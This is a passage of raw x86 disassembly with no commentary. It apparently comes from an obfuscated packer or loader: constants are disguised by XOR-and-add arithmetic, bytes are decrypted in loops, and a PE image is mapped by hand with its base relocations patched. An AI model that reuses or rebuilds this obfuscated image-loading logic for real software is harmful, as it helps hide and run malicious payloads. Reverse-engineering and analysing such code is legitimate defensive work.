  420bb6:	xor    cl,0x81
  420bb9:	add    cl,0x6
  420bbc:	movzx  ecx,cl
  420bbf:	cmp    edx,ecx
  420bc1:	jne    0x420bdb
  420bc3:	mov    ecx,DWORD PTR [ebp-0x18]
  420bc6:	xor    ecx,ebx
  420bc8:	lea    ecx,[ecx+edi*1+0x3272fa]
  420bcf:	xor    ecx,ebx
  420bd1:	cmp    ecx,0xf89c85bd
  420bd7:	jne    0x420ba0
  420bd9:	jmp    0x420be2
  420bdb:	mov    eax,DWORD PTR [ebp-0x10]
  420bde:	xor    eax,ebx
  420be0:	add    eax,esi
  420be2:	mov    ecx,DWORD PTR [ebp-0x10]
  420be5:	xor    ecx,ebx
  420be7:	add    ecx,esi
  420be9:	cmp    ecx,eax
  420beb:	je     0x420d61
  420bf1:	mov    eax,DWORD PTR [ebp-0x14]
  420bf4:	mov    eax,DWORD PTR [eax+0x8]
  420bf7:	mov    DWORD PTR [ebp-0xc],0xf89c85b5
  420bfe:	mov    DWORD PTR [ebp-0x40],0xf89cc3c6
  420c05:	mov    DWORD PTR [ebp-0x44],0xf89cb5b5
  420c0c:	mov    DWORD PTR [ebp-0x24],0xf89c85b9
  420c13:	mov    DWORD PTR [ebp-0x20],eax
  420c16:	mov    eax,DWORD PTR [ebp+0x8]
  420c19:	mov    ecx,DWORD PTR [ebp-0x24]
  420c1c:	xor    ecx,ebx
  420c1e:	add    ecx,esi
  420c20:	push   ecx
  420c21:	mov    ecx,DWORD PTR [ebp-0x44]
  420c24:	mov    eax,DWORD PTR [eax+0x1e0]
  420c2a:	xor    ecx,ebx
  420c2c:	add    ecx,esi
  420c2e:	push   ecx
  420c2f:	mov    ecx,DWORD PTR [ebp-0x40]
  420c32:	xor    ecx,ebx
  420c34:	add    ecx,esi
  420c36:	push   ecx
  420c37:	mov    ecx,DWORD PTR [ebp-0xc]
  420c3a:	xor    ecx,ebx
  420c3c:	add    ecx,esi
  420c3e:	push   ecx
  420c3f:	call   DWORD PTR [eax+0x14]
  420c42:	mov    edi,eax
  420c44:	mov    eax,DWORD PTR [ebp+0x8]
  420c47:	mov    ecx,DWORD PTR [ebp-0x24]
  420c4a:	mov    eax,DWORD PTR [eax+0x1e0]
  420c50:	xor    ecx,ebx
  420c52:	add    ecx,esi
  420c54:	push   ecx
  420c55:	mov    ecx,DWORD PTR [ebp-0x44]
  420c58:	xor    ecx,ebx
  420c5a:	add    ecx,esi
  420c5c:	push   ecx
  420c5d:	mov    ecx,DWORD PTR [ebp-0xc]
  420c60:	push   DWORD PTR [ebp-0x20]
  420c63:	xor    ecx,ebx
  420c65:	add    ecx,esi
  420c67:	push   ecx
  420c68:	call   DWORD PTR [eax+0x14]
  420c6b:	mov    ecx,DWORD PTR [ebp-0xc]
  420c6e:	xor    ecx,ebx
  420c70:	add    ecx,esi
  420c72:	mov    DWORD PTR [ebp-0x24],eax
  420c75:	cmp    ecx,edi
  420c77:	je     0x421004
  420c7d:	mov    ecx,DWORD PTR [ebp-0xc]
  420c80:	xor    ecx,ebx
  420c82:	add    ecx,esi
  420c84:	cmp    ecx,eax
  420c86:	je     0x421004
  420c8c:	mov    DWORD PTR [ebp-0x40],0xf89c85ba
  420c93:	mov    DWORD PTR [ebp-0x54],0xf89c85bb
  420c9a:	mov    ecx,DWORD PTR [ebp-0x40]
  420c9d:	xor    cl,0xb3
  420ca0:	sub    cl,0x6
  420ca3:	mov    BYTE PTR [edi],cl
  420ca5:	mov    ecx,DWORD PTR [ebp-0xc]
  420ca8:	xor    cl,0xb3
  420cab:	sub    cl,0x6
  420cae:	mov    BYTE PTR [edi+0x1],cl
  420cb1:	mov    ecx,DWORD PTR [ebp-0x54]
  420cb4:	xor    cl,0xb3
  420cb7:	sub    cl,0x6
  420cba:	mov    BYTE PTR [edi+0x2],cl
  420cbd:	and    DWORD PTR [ebp-0xc8],0x0
  420cc4:	and    DWORD PTR [ebp-0xdc],0x0
  420ccb:	lea    ecx,[ebp-0xdc]
  420cd1:	push   ecx
  420cd2:	push   DWORD PTR [ebp-0x20]
  420cd5:	push   eax
  420cd6:	lea    eax,[ebp-0xc8]
  420cdc:	push   eax
  420cdd:	mov    eax,DWORD PTR [ebp-0x14]
  420ce0:	push   DWORD PTR [eax+0xc]
  420ce3:	mov    eax,DWORD PTR [ebp-0x2c]
  420ce6:	add    eax,0x10
  420ce9:	push   eax
  420cea:	push   edi
  420ceb:	call   0x41ff8f
  420cf0:	mov    DWORD PTR [ebp-0x40],eax
  420cf3:	mov    eax,DWORD PTR [ebp+0x8]
  420cf6:	mov    ecx,DWORD PTR [ebp-0x50]
  420cf9:	mov    eax,DWORD PTR [eax+0x1e0]
  420cff:	xor    ecx,ebx
  420d01:	add    ecx,esi
  420d03:	push   ecx
  420d04:	mov    ecx,DWORD PTR [ebp-0xc]
  420d07:	xor    ecx,ebx
  420d09:	add    ecx,esi
  420d0b:	push   ecx
  420d0c:	push   edi
  420d0d:	call   DWORD PTR [eax+0x18]
  420d10:	mov    eax,DWORD PTR [ebp-0x40]
  420d13:	add    eax,0xffcd8d06
  420d18:	xor    eax,ebx
  420d1a:	cmp    eax,0xf89c85b5
  420d1f:	mov    eax,DWORD PTR [ebp+0x8]
  420d22:	mov    eax,DWORD PTR [eax+0x1e0]
  420d28:	mov    ecx,DWORD PTR [ebp-0x50]
  420d2b:	jne    0x420d4e
  420d2d:	xor    ecx,ebx
  420d2f:	add    ecx,esi
  420d31:	push   ecx
  420d32:	mov    ecx,DWORD PTR [ebp-0xc]
  420d35:	xor    ecx,ebx
  420d37:	add    ecx,esi
  420d39:	push   ecx
  420d3a:	push   DWORD PTR [ebp-0x2c]
  420d3d:	call   DWORD PTR [eax+0x18]
  420d40:	mov    eax,DWORD PTR [ebp-0x24]
  420d43:	mov    DWORD PTR [ebp-0x2c],eax
  420d46:	mov    eax,DWORD PTR [ebp-0x20]
  420d49:	mov    DWORD PTR [ebp-0x3c],eax
  420d4c:	jmp    0x420d61
  420d4e:	xor    ecx,ebx
  420d50:	add    ecx,esi
  420d52:	push   ecx
  420d53:	mov    ecx,DWORD PTR [ebp-0xc]
  420d56:	xor    ecx,ebx
  420d58:	add    ecx,esi
  420d5a:	push   ecx
  420d5b:	push   DWORD PTR [ebp-0x24]
  420d5e:	call   DWORD PTR [eax+0x18]
  420d61:	mov    eax,DWORD PTR [ebp-0x3c]
  420d64:	mov    DWORD PTR [ebp-0x34],eax
  420d67:	mov    eax,DWORD PTR [ebp-0x2c]
  420d6a:	mov    DWORD PTR [ebp-0x28],0xf89c85b5
  420d71:	mov    DWORD PTR [ebp-0x40],eax
  420d74:	mov    edi,0xf89c85b4
  420d79:	mov    DWORD PTR [ebp-0x30],edi
  420d7c:	mov    eax,DWORD PTR [ebp-0x28]
  420d7f:	xor    eax,ebx
  420d81:	add    eax,esi
  420d83:	mov    DWORD PTR [ebp-0xc],eax
  420d86:	mov    eax,DWORD PTR [ebp-0x28]
  420d89:	xor    eax,ebx
  420d8b:	add    eax,esi
  420d8d:	mov    DWORD PTR [ebp-0x14],eax
  420d90:	mov    DWORD PTR [ebp-0x44],0xf89c8595
  420d97:	mov    DWORD PTR [ebp-0x24],0xf89c85be
  420d9e:	mov    eax,DWORD PTR [ebp-0x28]
  420da1:	mov    ecx,DWORD PTR [ebp-0x34]
  420da4:	xor    eax,ebx
  420da6:	add    eax,esi
  420da8:	cmp    ecx,eax
  420daa:	je     0x420fa0
  420db0:	jmp    0x420f7c
  420db5:	mov    ecx,DWORD PTR [ebp-0xc]
  420db8:	mov    eax,DWORD PTR [ebp-0x34]
  420dbb:	sub    eax,ecx
  420dbd:	mov    ecx,DWORD PTR [ebp-0x44]
  420dc0:	xor    ecx,ebx
  420dc2:	add    ecx,esi
  420dc4:	xor    edx,edx
  420dc6:	div    ecx
  420dc8:	mov    DWORD PTR [ebp-0x14],eax
  420dcb:	mov    eax,DWORD PTR [ebp-0x24]
  420dce:	mov    ecx,DWORD PTR [ebp-0x14]
  420dd1:	xor    eax,ebx
  420dd3:	add    eax,esi
  420dd5:	cmp    ecx,eax
  420dd7:	jbe    0x420de3
  420dd9:	mov    eax,DWORD PTR [ebp-0x24]
  420ddc:	xor    eax,ebx
  420dde:	add    eax,esi
  420de0:	mov    DWORD PTR [ebp-0x14],eax
  420de3:	mov    eax,DWORD PTR [ebp-0x44]
  420de6:	mov    ecx,DWORD PTR [ebp-0x14]
  420de9:	xor    eax,ebx
  420deb:	add    eax,esi
  420ded:	imul   eax,ecx
  420df0:	mov    DWORD PTR [ebp-0x14],eax
  420df3:	mov    eax,DWORD PTR [ebp-0x28]
  420df6:	mov    ecx,DWORD PTR [ebp-0x14]
  420df9:	xor    eax,ebx
  420dfb:	add    eax,esi
  420dfd:	cmp    ecx,eax
  420dff:	je     0x420f6a
  420e05:	mov    eax,DWORD PTR [ebp-0x14]
  420e08:	mov    DWORD PTR [ebp-0x20],eax
  420e0b:	mov    eax,DWORD PTR [ebp-0xc]
  420e0e:	add    eax,DWORD PTR [ebp-0x40]
  420e11:	mov    DWORD PTR [ebp-0x4c],0xf89c85b5
  420e18:	mov    DWORD PTR [ebp-0x14],edi
  420e1b:	mov    DWORD PTR [ebp-0x54],0xf89c85bb
  420e22:	mov    DWORD PTR [ebp-0x1c],eax
  420e25:	mov    DWORD PTR [ebp-0x38],0xf89c85ba
  420e2c:	mov    DWORD PTR [ebp-0x8],edi
  420e2f:	mov    eax,DWORD PTR [ebp-0x4c]
  420e32:	xor    eax,ebx
  420e34:	add    eax,esi
  420e36:	jmp    0x420f29
  420e3b:	mov    DWORD PTR [ebp-0xe4],0xf89c85a2
  420e45:	mov    DWORD PTR [ebp-0xd0],0xf89c85af
  420e4f:	mov    eax,DWORD PTR [ebp-0x8]
  420e52:	mov    ecx,DWORD PTR [ebp-0x18]
  420e55:	xor    eax,ebx
  420e57:	add    eax,esi
  420e59:	imul   eax,ecx
  420e5c:	mov    ecx,DWORD PTR [ebp-0x1c]
  420e5f:	mov    al,BYTE PTR [eax+ecx*1]
  420e62:	mov    BYTE PTR [ebp-0x1],al
  420e65:	mov    eax,DWORD PTR [ebp-0x8]
  420e68:	mov    ecx,DWORD PTR [ebp-0x18]
  420e6b:	xor    eax,ebx
  420e6d:	add    eax,esi
  420e6f:	imul   eax,ecx
  420e72:	mov    ecx,DWORD PTR [ebp-0x54]
  420e75:	xor    ecx,ebx
  420e77:	add    eax,ecx
  420e79:	mov    ecx,DWORD PTR [ebp-0x1c]
  420e7c:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272fa]
  420e84:	mov    ecx,DWORD PTR [ebp-0xe4]
  420e8a:	xor    ecx,ebx
  420e8c:	lea    eax,[ecx+eax*1+0x3272fa]
  420e93:	movzx  ecx,BYTE PTR [ebp-0x1]
  420e97:	xor    ecx,eax
  420e99:	mov    BYTE PTR [ebp-0x1],cl
  420e9c:	mov    al,BYTE PTR [ebp-0x1]
  420e9f:	mov    ecx,DWORD PTR [ebp-0x8]
  420ea2:	mov    edx,DWORD PTR [ebp-0x18]
  420ea5:	xor    ecx,ebx
  420ea7:	add    ecx,esi
  420ea9:	imul   ecx,edx
  420eac:	mov    edx,DWORD PTR [ebp-0x1c]
  420eaf:	mov    BYTE PTR [ecx+edx*1],al
  420eb2:	mov    eax,DWORD PTR [ebp-0x8]
  420eb5:	mov    ecx,DWORD PTR [ebp-0x18]
  420eb8:	xor    eax,ebx
  420eba:	add    eax,esi
  420ebc:	imul   eax,ecx
  420ebf:	mov    ecx,DWORD PTR [ebp-0x1c]
  420ec2:	mov    al,BYTE PTR [eax+ecx*1]
  420ec5:	mov    BYTE PTR [ebp-0x1],al
  420ec8:	mov    eax,DWORD PTR [ebp-0x8]
  420ecb:	mov    ecx,DWORD PTR [ebp-0x18]
  420ece:	xor    eax,ebx
  420ed0:	add    eax,esi
  420ed2:	imul   eax,ecx
  420ed5:	mov    ecx,DWORD PTR [ebp-0x14]
  420ed8:	xor    ecx,ebx
  420eda:	add    eax,ecx
  420edc:	mov    ecx,DWORD PTR [ebp-0x1c]
  420edf:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272fa]
  420ee7:	mov    ecx,DWORD PTR [ebp-0xd0]
  420eed:	xor    ecx,ebx
  420eef:	lea    eax,[ecx+eax*1+0x3272fa]
  420ef6:	movzx  ecx,BYTE PTR [ebp-0x1]
  420efa:	xor    ecx,eax
  420efc:	mov    BYTE PTR [ebp-0x1],cl
  420eff:	mov    al,BYTE PTR [ebp-0x1]
  420f02:	mov    ecx,DWORD PTR [ebp-0x8]
  420f05:	mov    edx,DWORD PTR [ebp-0x18]
  420f08:	xor    ecx,ebx
  420f0a:	add    ecx,esi
  420f0c:	imul   ecx,edx
  420f0f:	mov    edx,DWORD PTR [ebp-0x1c]
  420f12:	mov    BYTE PTR [ecx+edx*1],al
  420f15:	mov    eax,DWORD PTR [ebp-0x38]
  420f18:	mov    ecx,DWORD PTR [ebp-0x14]
  420f1b:	xor    eax,ebx
  420f1d:	xor    ecx,ebx
  420f1f:	add    eax,esi
  420f21:	add    ecx,esi
  420f23:	imul   eax,ecx
  420f26:	add    eax,DWORD PTR [ebp-0x18]
  420f29:	mov    DWORD PTR [ebp-0x18],eax
  420f2c:	mov    eax,DWORD PTR [ebp-0x18]
  420f2f:	mov    ecx,DWORD PTR [ebp-0x20]
  420f32:	cmp    ecx,eax
  420f34:	jb     0x420e3b
  420f3a:	mov    eax,DWORD PTR [ebp-0x14]
  420f3d:	mov    ecx,DWORD PTR [ebp-0x20]
  420f40:	xor    eax,ebx
  420f42:	add    eax,esi
  420f44:	imul   eax,ecx
  420f47:	mov    ecx,DWORD PTR [ebp-0x4c]
  420f4a:	xor    ecx,ebx
  420f4c:	add    ecx,esi
  420f4e:	or     eax,ecx
  420f50:	mov    ecx,DWORD PTR [ebp-0x30]
  420f53:	xor    ecx,ebx
  420f55:	add    eax,ecx
  420f57:	mov    ecx,DWORD PTR [ebp-0x30]
  420f5a:	xor    ecx,ebx
  420f5c:	add    eax,ecx
  420f5e:	mov    ecx,DWORD PTR [ebp-0xc]
  420f61:	lea    eax,[eax+ecx*1+0x64e5f4]
  420f68:	jmp    0x420f79
  420f6a:	mov    eax,DWORD PTR [ebp-0x30]
  420f6d:	mov    ecx,DWORD PTR [ebp-0xc]
  420f70:	xor    eax,ebx
  420f72:	lea    eax,[eax+ecx*1+0x3272fa]
  420f79:	mov    DWORD PTR [ebp-0xc],eax
  420f7c:	mov    eax,DWORD PTR [ebp-0x30]
  420f7f:	xor    eax,ebx
  420f81:	mov    ecx,0xffcd8d06
  420f86:	sub    ecx,eax
  420f88:	add    ecx,DWORD PTR [ebp-0x34]
  420f8b:	mov    eax,DWORD PTR [ebp-0x30]
  420f8e:	mov    edx,DWORD PTR [ebp-0xc]
  420f91:	xor    eax,ebx
  420f93:	add    eax,esi
  420f95:	imul   eax,edx
  420f98:	cmp    eax,ecx
  420f9a:	jbe    0x420db5
  420fa0:	push   DWORD PTR [ebp+0x8]
  420fa3:	mov    eax,DWORD PTR [ebp+0x8]
  420fa6:	push   DWORD PTR [eax+0x1cc]
  420fac:	lea    eax,[ebp-0xd8]
  420fb2:	push   eax
  420fb3:	mov    eax,DWORD PTR [ebp+0x8]
  420fb6:	mov    eax,DWORD PTR [eax+0x1c4]
  420fbc:	push   DWORD PTR [eax]
  420fbe:	mov    eax,DWORD PTR [ebp+0x8]
  420fc1:	mov    eax,DWORD PTR [eax+0x1c0]
  420fc7:	push   DWORD PTR [eax]
  420fc9:	push   DWORD PTR [ebp-0x3c]
  420fcc:	push   DWORD PTR [ebp-0x2c]
  420fcf:	call   0x421a66
  420fd4:	mov    DWORD PTR [ebp-0x40],eax
  420fd7:	mov    eax,DWORD PTR [ebp-0x10]
  420fda:	mov    ecx,DWORD PTR [ebp-0x2c]
  420fdd:	xor    eax,ebx
  420fdf:	add    eax,esi
  420fe1:	cmp    eax,ecx
  420fe3:	je     0x421004
  420fe5:	mov    eax,DWORD PTR [ebp+0x8]
  420fe8:	mov    ecx,DWORD PTR [ebp-0x50]
  420feb:	mov    eax,DWORD PTR [eax+0x1e0]
  420ff1:	xor    ecx,ebx
  420ff3:	add    ecx,esi
  420ff5:	push   ecx
  420ff6:	mov    ecx,DWORD PTR [ebp-0x10]
  420ff9:	xor    ecx,ebx
  420ffb:	add    ecx,esi
  420ffd:	push   ecx
  420ffe:	push   DWORD PTR [ebp-0x2c]
  421001:	call   DWORD PTR [eax+0x18]
  421004:	pop    edi
  421005:	pop    esi
  421006:	pop    ebx
  421007:	leave  
  421008:	ret    0x4
  42100b:	push   ebp
  42100c:	mov    ebp,esp
  42100e:	push   ecx
  42100f:	push   ecx
  421010:	lea    eax,[ebp-0x8]
  421013:	mov    DWORD PTR [ebp-0x4],eax
  421016:	push   esi
  421017:	mov    esi,DWORD PTR [ebp-0x4]
  42101a:	mov    eax,0xf881bacf
  42101f:	mov    DWORD PTR [esi],eax
  421021:	mov    esi,DWORD PTR [ebp-0x8]
  421024:	cmp    esi,eax
  421026:	pop    esi
  421027:	jne    0x421031
  421029:	mov    BYTE PTR [ecx+0xa],0x7b
  42102d:	mov    BYTE PTR [edx+0x8],0xcc
  421031:	mov    BYTE PTR [edx+0xa],0x7b
  421035:	mov    BYTE PTR [ecx+0x2],0xe9
  421039:	leave  
  42103a:	ret    
  42103b:	push   ebp
  42103c:	mov    ebp,esp
  42103e:	push   ecx
  42103f:	push   ecx
  421040:	lea    eax,[ebp-0x8]
  421043:	mov    DWORD PTR [ebp-0x4],eax
  421046:	mov    edx,DWORD PTR [ebp-0x4]
  421049:	mov    eax,0xf88b0bd3
  42104e:	mov    DWORD PTR [edx],eax
  421050:	mov    edx,DWORD PTR [ebp-0x8]
  421053:	cmp    edx,eax
  421055:	jne    0x421066
  421057:	mov    eax,DWORD PTR [ebp+0x8]
  42105a:	mov    BYTE PTR [ecx+0x9],0xef
  42105e:	mov    BYTE PTR [eax+0x7],0xa4
  421062:	mov    BYTE PTR [ecx+0x6],0xec
  421066:	mov    BYTE PTR [ecx+0x3],0xdf
  42106a:	leave  
  42106b:	ret    0x4
  42106e:	push   ebp
  42106f:	mov    ebp,esp
  421071:	push   ecx
  421072:	push   ecx
  421073:	lea    eax,[ebp-0x8]
  421076:	mov    DWORD PTR [ebp-0x4],eax
  421079:	mov    edx,DWORD PTR [ebp-0x4]
  42107c:	mov    eax,0x7e0dacf
  421081:	mov    DWORD PTR [edx],eax
  421083:	mov    edx,DWORD PTR [ebp-0x8]
  421086:	cmp    edx,eax
  421088:	jne    0x42108e
  42108a:	mov    BYTE PTR [ecx+0x7],0xa4
  42108e:	mov    eax,DWORD PTR [ebp+0x8]
  421091:	mov    BYTE PTR [ecx+0x1],0xe2
  421095:	mov    BYTE PTR [eax+0x9],0xcf
  421099:	leave  
  42109a:	ret    0x4
  42109d:	push   ebp
  42109e:	mov    ebp,esp
  4210a0:	push   ecx
  4210a1:	push   ecx
  4210a2:	lea    eax,[ebp-0x8]
  4210a5:	mov    DWORD PTR [ebp-0x4],eax
  4210a8:	push   esi
  4210a9:	mov    esi,DWORD PTR [ebp-0x4]
  4210ac:	mov    eax,0x7060e3e
  4210b1:	mov    DWORD PTR [esi],eax
  4210b3:	mov    esi,DWORD PTR [ebp-0x8]
  4210b6:	cmp    esi,eax
  4210b8:	pop    esi
  4210b9:	jne    0x4210c5
  4210bb:	mov    BYTE PTR [edx+0x4],0xe8
  4210bf:	mov    WORD PTR [ecx+0x3],0xe8df
  4210c5:	mov    BYTE PTR [edx],0xbc
  4210c8:	leave  
  4210c9:	ret    
  4210ca:	push   ebp
  4210cb:	mov    ebp,esp
  4210cd:	push   ecx
  4210ce:	push   ecx
  4210cf:	lea    eax,[ebp-0x8]
  4210d2:	mov    DWORD PTR [ebp-0x4],eax
  4210d5:	mov    edx,DWORD PTR [ebp-0x4]
  4210d8:	mov    eax,0xf8870b3f
  4210dd:	mov    DWORD PTR [edx],eax
  4210df:	mov    edx,DWORD PTR [ebp-0x8]
  4210e2:	cmp    edx,eax
  4210e4:	jne    0x4210f1
  4210e6:	mov    eax,DWORD PTR [ebp+0x8]
  4210e9:	mov    BYTE PTR [ecx+0x8],0xec
  4210ed:	mov    BYTE PTR [eax+0x1],0xe2
  4210f1:	mov    BYTE PTR [ecx+0x5],0xf0
  4210f5:	leave  
  4210f6:	ret    0x4
  4210f9:	push   esi
  4210fa:	mov    ecx,edi
  4210fc:	call   0x4210ca
  421101:	mov    edx,edi
  421103:	mov    ecx,esi
  421105:	mov    BYTE PTR [esi],0xdc
  421108:	call   0x42109d
  42110d:	push   esi
  42110e:	mov    ecx,edi
  421110:	mov    BYTE PTR [esi+0x5],0xf0
  421114:	call   0x42106e
  421119:	push   esi
  42111a:	mov    BYTE PTR [esi+0x6],0xec
  42111e:	call   0x42103b
  421123:	mov    BYTE PTR [esi+0x2],0xe9
  421127:	mov    edx,esi
  421129:	jmp    0x42100b
  42112e:	push   ebp
  42112f:	mov    ebp,esp
  421131:	push   ecx
  421132:	mov    ecx,DWORD PTR [edx+0x194]
  421138:	push   esi
  421139:	mov    esi,DWORD PTR [ebp+0x8]
  42113c:	mov    esi,DWORD PTR [esi]
  42113e:	mov    DWORD PTR [ecx],esi
  421140:	mov    ecx,DWORD PTR [edx+0x194]
  421146:	mov    ecx,DWORD PTR [ecx]
  421148:	mov    esi,DWORD PTR [edx+0x190]
  42114e:	mov    DWORD PTR [esi],ecx
  421150:	mov    eax,DWORD PTR [edx+0x194]
  421156:	mov    ecx,DWORD PTR [eax]
  421158:	mov    ecx,DWORD PTR [ecx+0x3c]
  42115b:	add    ecx,DWORD PTR [eax]
  42115d:	mov    DWORD PTR [ebp-0x4],0xf89ca5b5
  421164:	mov    eax,DWORD PTR [ebp-0x4]
  421167:	movzx  ecx,WORD PTR [ecx+0x16]
  42116b:	xor    eax,0x75108b3
  421170:	add    eax,0x3272fa
  421175:	pop    esi
  421176:	test   ecx,eax
  421178:	je     0x421186
  42117a:	mov    eax,DWORD PTR [edx+0x1c8]
  421180:	mov    DWORD PTR [eax],0xf89c85b4
  421186:	leave  
  421187:	ret    0x4
  42118a:	push   ebp
  42118b:	mov    ebp,esp
  42118d:	sub    esp,0x70
  421190:	and    DWORD PTR [ebp-0x20],0x0
  421194:	mov    DWORD PTR [ebp-0x18],0xf89cb5b5
  42119b:	mov    DWORD PTR [ebp-0x1c],0xf89c85f5
  4211a2:	mov    DWORD PTR [ebp-0x2c],0xf89c85b9
  4211a9:	mov    DWORD PTR [ebp-0x14],0xf89c85bb
  4211b0:	mov    DWORD PTR [ebp-0x2c],0xf89f05b5
  4211b7:	mov    eax,DWORD PTR [ebp+0x20]
  4211ba:	mov    eax,DWORD PTR [eax+0x194]
  4211c0:	mov    DWORD PTR [ebp-0xc],eax
  4211c3:	mov    eax,DWORD PTR [ebp+0x20]
  4211c6:	push   ebx
  4211c7:	push   esi
  4211c8:	mov    esi,DWORD PTR [eax+0x190]
  4211ce:	mov    eax,DWORD PTR [ebp+0x20]
  4211d1:	mov    eax,DWORD PTR [eax+0x18c]
  4211d7:	mov    DWORD PTR [ebp-0x8],eax
  4211da:	mov    eax,DWORD PTR [eax]
  4211dc:	push   edi
  4211dd:	mov    DWORD PTR [ebp-0x4],esi
  4211e0:	test   eax,eax
  4211e2:	jne    0x4211ef
  4211e4:	push   DWORD PTR [ebp+0x1c]
  4211e7:	mov    edx,DWORD PTR [ebp+0x20]
  4211ea:	call   0x42112e
  4211ef:	mov    eax,DWORD PTR [esi]
  4211f1:	mov    ebx,DWORD PTR [esi]
  4211f3:	add    ebx,DWORD PTR [eax+0x3c]
  4211f6:	mov    eax,DWORD PTR [ebp+0xc]
  4211f9:	mov    ecx,DWORD PTR [ebp-0x8]
  4211fc:	mov    ecx,DWORD PTR [ecx]
  4211fe:	mov    esi,0x75108b3
  421203:	xor    eax,esi
  421205:	mov    edi,0x3272fa
  42120a:	add    eax,edi
  42120c:	cmp    eax,ecx
  42120e:	jne    0x421446
  421214:	mov    eax,DWORD PTR [ebp-0xc]
  421217:	mov    eax,DWORD PTR [eax]
  421219:	mov    DWORD PTR [ebp-0x10],eax
  42121c:	mov    eax,DWORD PTR [ebx+0x50]
  42121f:	mov    DWORD PTR [ebp-0x68],eax
  421222:	mov    eax,DWORD PTR [ebp-0x18]
  421225:	xor    eax,esi
  421227:	add    eax,edi
  421229:	mov    DWORD PTR [ebp-0x64],eax
  42122c:	mov    eax,DWORD PTR [ebp-0x14]
  42122f:	and    DWORD PTR [ebp-0x6c],0x0
  421233:	xor    eax,esi
  421235:	add    eax,edi
  421237:	mov    DWORD PTR [ebp-0x60],eax
  42123a:	lea    eax,[ebp-0x70]
  42123d:	push   eax
  42123e:	mov    eax,DWORD PTR [ebp+0x8]
  421241:	xor    eax,esi
  421243:	add    eax,edi
  421245:	push   eax
  421246:	mov    eax,DWORD PTR [ebp+0x20]
  421249:	add    eax,0xaa
  42124e:	push   eax
  42124f:	mov    eax,DWORD PTR [ebp+0x20]
  421252:	mov    eax,DWORD PTR [eax+0x198]
  421258:	mov    DWORD PTR [ebp-0x70],0x4
  42125f:	push   DWORD PTR [eax]
  421261:	mov    eax,DWORD PTR [ebp+0x10]
  421264:	call   eax
  421266:	mov    ecx,DWORD PTR [ebp-0xc]
  421269:	mov    ecx,DWORD PTR [ecx]
  42126b:	mov    edx,DWORD PTR [ebp-0x8]
  42126e:	mov    DWORD PTR [ebp-0x6c],eax
  421271:	mov    DWORD PTR [ebp+0x1c],eax
  421274:	mov    DWORD PTR [edx],ecx
  421276:	mov    ecx,DWORD PTR [ebp-0x4]
  421279:	mov    DWORD PTR [ecx],eax
  42127b:	mov    eax,DWORD PTR [ebx+0x50]
  42127e:	mov    DWORD PTR [ebp-0x68],eax
  421281:	mov    eax,DWORD PTR [ebp-0x1c]
  421284:	xor    eax,esi
  421286:	add    eax,edi
  421288:	mov    DWORD PTR [ebp-0x64],eax
  42128b:	lea    eax,[ebp-0x20]
  42128e:	mov    DWORD PTR [ebp-0x60],eax
  421291:	lea    eax,[ebp-0x70]
  421294:	push   eax
  421295:	mov    eax,DWORD PTR [ebp+0x8]
  421298:	xor    eax,esi
  42129a:	add    eax,edi
  42129c:	push   eax
  42129d:	mov    eax,DWORD PTR [ebp+0x20]
  4212a0:	add    eax,0xee
  4212a5:	push   eax
  4212a6:	mov    eax,DWORD PTR [ebp+0x20]
  4212a9:	mov    eax,DWORD PTR [eax+0x198]
  4212af:	mov    DWORD PTR [ebp-0x70],0x4
  4212b6:	push   DWORD PTR [eax]
  4212b8:	mov    eax,DWORD PTR [ebp+0x10]
  4212bb:	call   eax
  4212bd:	test   eax,eax
  4212bf:	je     0x4212e4
  4212c1:	and    DWORD PTR [ebp+0xc],0x0
  4212c5:	cmp    DWORD PTR [ebx+0x50],0x0
  4212c9:	jbe    0x4212e4
  4212cb:	mov    eax,DWORD PTR [ebp+0x1c]
  4212ce:	mov    ecx,DWORD PTR [ebp-0x10]
  4212d1:	sub    ecx,eax
  4212d3:	mov    dl,BYTE PTR [ecx+eax*1]
  4212d6:	inc    DWORD PTR [ebp+0xc]
  4212d9:	mov    BYTE PTR [eax],dl
  4212db:	mov    edx,DWORD PTR [ebp+0xc]
  4212de:	inc    eax
  4212df:	cmp    edx,DWORD PTR [ebx+0x50]
  4212e2:	jb     0x4212d3
  4212e4:	mov    edx,DWORD PTR [ebp+0x1c]
  4212e7:	mov    ecx,DWORD PTR [edx+0x3c]
  4212ea:	add    ecx,edx
  4212ec:	mov    eax,DWORD PTR [ecx+0xa0]
  4212f2:	mov    ebx,DWORD PTR [ecx+0x28]
  4212f5:	add    eax,edx
  4212f7:	sub    edx,DWORD PTR [ebp-0x10]
  4212fa:	add    ebx,DWORD PTR [ebp+0x1c]
  4212fd:	mov    DWORD PTR [ebp+0xc],edx
  421300:	mov    DWORD PTR [ebp-0x2c],ecx
  421303:	mov    DWORD PTR [ebp-0x14],ebx
  421306:	mov    DWORD PTR [ebp-0x8],0x0
  42130d:	jmp    0x421389
  42130f:	add    edx,0xfffffff8
  421312:	shr    edx,1
  421314:	mov    DWORD PTR [ebp-0x18],edx
  421317:	je     0x421375
  421319:	lea    edx,[eax+0x8]
  42131c:	mov    DWORD PTR [ebp-0x4],edx
  42131f:	mov    edx,DWORD PTR [ebp-0x18]
  421322:	mov    DWORD PTR [ebp-0x18],edx
  421325:	mov    edx,DWORD PTR [ebp-0x4]
  421328:	movzx  edx,WORD PTR [edx]
  42132b:	mov    DWORD PTR [ebp-0x24],edx
  42132e:	and    edx,0xfff
  421334:	mov    DWORD PTR [ebp-0x28],edx
  421337:	mov    edx,DWORD PTR [ebp-0x24]
  42133a:	shr    edx,0xc
  42133d:	add    edx,0xffcd8d06
  421343:	xor    edx,esi
  421345:	cmp    edx,0xf89c85ba
  42134b:	jne    0x42136c
  42134d:	mov    edx,DWORD PTR [ebp-0x28]
  421350:	add    edx,DWORD PTR [ebp+0x1c]
  421353:	mov    ebx,DWORD PTR [eax]
  421355:	cmp    DWORD PTR [ebx+edx*1],0x0
  421359:	je     0x421369
  42135b:	mov    ecx,DWORD PTR [ebp+0xc]
  42135e:	add    ecx,DWORD PTR [ebx+edx*1]
  421361:	mov    ebx,DWORD PTR [eax]
  421363:	mov    DWORD PTR [edx+ebx*1],ecx
  421366:	mov    ecx,DWORD PTR [ebp-0x2c]
  421369:	mov    ebx,DWORD PTR [ebp-0x14]
  42136c:	add    DWORD PTR [ebp-0x4],0x2
  421370:	dec    DWORD PTR [ebp-0x18]
  421373:	jne    0x421325
  421375:	mov    edx,DWORD PTR [ebp-0xc]
  421378:	add    DWORD PTR [ebp-0x8],edx
